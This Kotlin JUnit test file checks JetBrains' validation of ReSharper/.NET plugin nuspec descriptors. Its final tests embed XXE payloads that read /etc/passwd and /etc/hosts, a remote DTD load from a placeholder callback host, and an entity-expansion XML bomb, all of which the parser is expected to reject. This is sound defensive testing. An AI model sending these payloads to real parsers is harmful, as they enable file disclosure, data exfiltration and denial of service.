package com.jetbrains.plugin.structure.dotnet.mock

import com.jetbrains.plugin.structure.base.problems.*
import com.jetbrains.plugin.structure.base.utils.simpleName
import com.jetbrains.plugin.structure.dotnet.ReSharperPlugin
import com.jetbrains.plugin.structure.dotnet.ReSharperPluginManager
import com.jetbrains.plugin.structure.dotnet.problems.InvalidDependencyVersionError
import com.jetbrains.plugin.structure.dotnet.problems.NullIdDependencyError
import com.jetbrains.plugin.structure.dotnet.problems.createIncorrectDotNetPluginFileProblem
import com.jetbrains.plugin.structure.mocks.BasePluginManagerTest
import com.jetbrains.plugin.structure.rules.FileSystemType
import org.junit.Assert
import org.junit.Test
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class DotNetPluginTest(fileSystemType: FileSystemType) : BasePluginManagerTest<ReSharperPlugin, ReSharperPluginManager>(fileSystemType) {
  override fun createManager(extractDirectory: Path) =
    ReSharperPluginManager.createManager(extractDirectory)

  @Test
  fun `incorrect plugin file type`() {
    val incorrect = temporaryFolder.newFile("incorrect.txt")
    assertProblematicPlugin(incorrect, listOf(createIncorrectDotNetPluginFileProblem(incorrect.simpleName)))
  }

  @Test
  fun `plugin file does not exist`() {
    val nonExistentFile = Paths.get("non-existent-file")
    Assert.assertThrows("Plugin file non-existent-file does not exist", IllegalArgumentException::class.java) {
      createPluginSuccessfully(nonExistentFile)
    }
  }

  @Test
  fun `unable to extract plugin`() {
    val brokenZipArchive = temporaryFolder.newFile("broken.nupkg")
    assertProblematicPlugin(brokenZipArchive, listOf(PluginDescriptorIsNotFound("*.nuspec")))
  }

  @Test
  fun `no meta-inf plugin xml found`() {
    val file = temporaryFolder.newFile("withoutDescriptor.nupkg")
    ZipOutputStream(Files.newOutputStream(file)).use { it.putNextEntry(ZipEntry("randomEntry.txt")) }
    assertProblematicPlugin(file, listOf(PluginDescriptorIsNotFound("*.nuspec")))
  }

  @Test
  fun `completely invalid plugin descriptor`() {
    `test invalid plugin xml`(
      "abracadabra",
      listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `plugin id is not specified`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { id = "" },
      listOf(PropertyNotSpecified("id"))
    )
  }

  @Test
  fun `invalid plugin id`() {
    val invalidIds = listOf(
      "hello!world",
      "123@abc",
      "A#B%",
      "first second",
      "newline\nhere",
      "tab\there",
      "slash/backslash",
      "colon:semicolon;",
      "quote\"apostrophe'",
      "test~test"
    )
    invalidIds.forEach {
      `test invalid plugin xml`(
        perfectDotNetBuilder.modify { id = "<id>vendor.$it</id>" },
        listOf(InvalidPluginIDProblem("vendor.$it"))
      )
    }
  }

  @Test
  fun `plugin version is not specified`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { version = "" },
      listOf(PropertyNotSpecified("version"))
    )
  }

  @Test
  fun `plugin license is not specified`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { licenseUrl = "" },
      listOf(PropertyNotSpecified("licenseUrl"))
    )
  }

  @Test
  fun `plugin long name`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { title = "<title>${"a".repeat(65)}</title>" },
      listOf(TooLongPropertyValue("", "title", 65, 64))
    )
  }

  @Test
  fun `plugin long releaseNotes`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { releaseNotes = "<releaseNotes>${"a".repeat(65550)}</releaseNotes>" },
      listOf(TooLongPropertyValue("", "releaseNotes", 65550, 65000))
    )
  }

  @Test
  fun `plugin authors is not specified`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { authors = "" },
      listOf(PropertyNotSpecified("authors"))
    )
  }

  @Test
  fun `plugin description is not specified`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { description = "" },
      listOf(PropertyNotSpecified("description"))
    )
  }

  @Test
  fun `dependency name is not specified`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { dependencies = "<dependencies><dependency version=\"[8.0, 8.3)\"/></dependencies>" },
      listOf(NullIdDependencyError())
    )
  }

  @Test
  fun `dependency version is blank`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { dependencies = "<dependencies><dependency id=\"ReSharper\" version=\"[8.0, 8.3)\" /><dependency id=\"Wave\" version=\"\"/></dependencies>" },
      listOf(InvalidDependencyVersionError("", "Original range string is blank"))
    )
  }

  @Test
  fun `more than 2 values in dependency version`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { dependencies = "<dependencies><dependency id=\"ReSharper\" version=\"[8.0, 8.3)\" /><dependency id=\"Wave\" version=\"[182.0.0, 183.0.0, 184.0.0)\"/></dependencies>" },
      listOf(InvalidDependencyVersionError("[182.0.0, 183.0.0, 184.0.0)", "There shouldn't be more than 2 values in range"))
    )
  }

  @Test
  fun `wrong dependency version format`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { dependencies = "<dependencies><dependency id=\"ReSharper\" version=\"[8.0)\" /><dependency id=\"Wave\" version=\"[182.0.0, 184.0.0)\"/></dependencies>" },
      listOf(InvalidDependencyVersionError("[8.0)", "The formats (1.0.0], [1.0.0) and (1.0.0) are invalid"))
    )
  }

  @Test
  fun `upper and lower bounds were specified`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { dependencies = "<dependencies><dependency id=\"Wave\" version=\"(, )\"/></dependencies>" },
      listOf(InvalidDependencyVersionError("(, )", "Neither of upper nor lower bounds were specified"))
    )
  }

  @Test
  fun `lower bound is greater than upper one`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { dependencies = "<dependencies><dependency id=\"Wave\" version=\"(184.0, 183.0)\"/></dependencies>" },
      listOf(InvalidDependencyVersionError("(184.0, 183.0)", "maxVersion should be greater than minVersion"))
    )
  }

  @Test
  fun `wrong parentheses format=`() {
    `test invalid plugin xml`(
      perfectDotNetBuilder.modify { dependencies = "<dependencies><dependency id=\"Wave\" version=\"(183.0, 183.0)\"/></dependencies>" },
      listOf(InvalidDependencyVersionError("(183.0, 183.0)", "Wrong format. (1.0.0, 1.0.0], [1.0.0, 1.0.0) and (1.0.0, 1.0.0) are invalid"))
    )
  }

  @Test
  fun `id as plugin name when empty title`() {
    testValidPluginXML(perfectDotNetBuilder.modify {
      id = "<id>Vendor.PluginId</id>"
      title = "<title></title>"
    }) { plugin ->
      Assert.assertEquals("PluginId", plugin.pluginName)
    }
  }

  @Test
  fun `id as plugin name when null title`() {
    testValidPluginXML(perfectDotNetBuilder.modify {
      id = "<id>Vendor.PluginId</id>"
      title = null
    }) { plugin ->
      Assert.assertEquals("PluginId", plugin.pluginName)
    }
  }

  @Test
  fun `valid plugin id`() {
    val invalidIds = listOf(
      "abc1324_.-",
      "abc.123",
      "ABC.123",
      "test-test.test-test"
    )
    invalidIds.forEach {
      testValidPluginXML(perfectDotNetBuilder.modify { id = "<id>$it</id>" }) {}
    }
  }

  @Test
  fun `one component id without wave dependency`() {
    testValidPluginXML(perfectDotNetBuilder.modify {
      id = "<id>PluginId</id>"
      title = "<title></title>"
      dependencies = "<dependencies><dependency id=\"ReSharper\" version=\"[8.0, 8.3)\" /></dependencies>"
    }) { plugin ->
      Assert.assertEquals("PluginId", plugin.pluginName)
    }
  }

  @Test
  fun `failed to parse xml with xxe in value`() {
    val xxe = """
      <!DOCTYPE description [
        <!ENTITY file SYSTEM "file:///etc/passwd">
      ]>

      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
        <metadata>
          <id>xxe in dotnet description test</id>
          <version>0.1</version>
          <description>&file;</description>
          <authors>Ivan Chirkov</authors>
          <title>xxe-in-dotnet-description-test</title>
          <summarytest</summary>
          <licenseUrl>http://license.url</licenseUrl>
          <requireLicenseAcceptance>false</requireLicenseAcceptance>
          <releaseNotes></releaseNotes>
        </metadata>
      </package>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with xxe in attribute`() {
    val xxe = """
      <!DOCTYPE doc [
        <!ENTITY ff SYSTEM "file:///etc/hosts">
      ]>

      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
        <metadata>
          <id>xxe in dotnet description test</id>
          <version>0.1</version>
          <description info="&ff;">test</description>
          <authors>Ivan Chirkov</authors>
          <title>xxe-in-dotnet-description-test</title>
          <summary>test</summary>
          <licenseUrl>http://license.url</licenseUrl>
          <requireLicenseAcceptance>false</requireLicenseAcceptance>
          <releaseNotes></releaseNotes>
        </metadata>
      </package>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with remote dtd xxe`() {
    val xxe = """
      <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://YOUR_CALLBACK/evil.dtd">
        %remote;
      ]>

      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
        <metadata>
          <id>xxe in dotnet description test</id>
          <version>0.1</version>
          <description>test</description>
          <authors>Ivan Chirkov</authors>
          <title>xxe-in-dotnet-description-test</title>
          <summary>test</summary>
          <licenseUrl>http://license.url</licenseUrl>
          <requireLicenseAcceptance>false</requireLicenseAcceptance>
          <releaseNotes></releaseNotes>
        </metadata>
      </package>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with error local dtd`() {
    val xxe = """
      <!DOCTYPE root [
        <!ENTITY % local "abc">
        <!ENTITY name "%local;">
        <!ENTITY ex "start &name; end">
      ]>

      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
        <metadata>
          <id>xxe in dotnet description test</id>
          <version>0.1</version>
          <description>&ex;</description>
          <authors>Ivan Chirkov</authors>
          <title>xxe-in-dotnet-description-test</title>
          <summary>test</summary>
          <licenseUrl>http://license.url</licenseUrl>
          <requireLicenseAcceptance>false</requireLicenseAcceptance>
          <releaseNotes></releaseNotes>
        </metadata>
      </package>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with xml bomb`() {
    val xxe = """
      <!DOCTYPE lolz [
       <!ENTITY a "aaaaaaaaaa">
       <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
       <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
       <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
       <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
      ]>

      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
        <metadata>
          <id>xxe in dotnet description test</id>
          <version>0.1</version>
          <description>&e;</description>
          <authors>Ivan Chirkov</authors>
          <title>xxe-in-dotnet-description-test</title>
          <summary>test</summary>
          <licenseUrl>http://license.url</licenseUrl>
          <requireLicenseAcceptance>false</requireLicenseAcceptance>
          <releaseNotes></releaseNotes>
        </metadata>
      </package>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  private fun `test invalid plugin xml`(pluginXmlContent: String, expectedProblems: List<PluginProblem>) {
    val pluginFolder = getTempPluginArchive(pluginXmlContent)
    assertProblematicPlugin(pluginFolder, expectedProblems)
  }

  private fun testValidPluginXML(pluginXmlContent: String, checks: (ReSharperPlugin) -> Unit) {
    val pluginFolder = getTempPluginArchive(pluginXmlContent)
    checks(createPluginSuccessfully(pluginFolder).plugin)
  }

  private fun getTempPluginArchive(pluginXmlContent: String): Path {
    val pluginFile = temporaryFolder.newFile("${UUID.randomUUID()}.nupkg")
    ZipOutputStream(Files.newOutputStream(pluginFile)).use {
      it.putNextEntry(ZipEntry("Vendor.PluginName.nuspec"))
      it.write(pluginXmlContent.toByteArray())
      it.closeEntry()
    }
    return pluginFile
  }
}